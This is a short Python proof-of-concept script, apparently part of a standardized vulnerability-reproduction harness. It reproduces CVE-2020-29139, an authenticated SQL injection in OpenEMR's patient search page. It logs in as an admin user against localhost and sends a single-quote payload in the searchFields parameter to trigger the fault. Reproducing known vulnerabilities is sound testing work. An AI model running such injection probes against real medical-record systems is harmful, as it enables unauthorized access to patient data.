#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2020-29139 
[TYPE] SQL injection
[METHOD] GET
[CRASH_FIELDS] searchFields
[TARGET_URL] http://localhost/openemr/interface/main/finder/patient_select.php
[PARAMS] findBy=Filter&searchFields=1'
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then GET to /interface/main/finder/patient_select.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2020-29139 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/main/finder/patient_select.php'
    poc_params = {
        'findBy': 'Filter',
        'searchFields': "1'"  # SQL injection payload
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_params,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
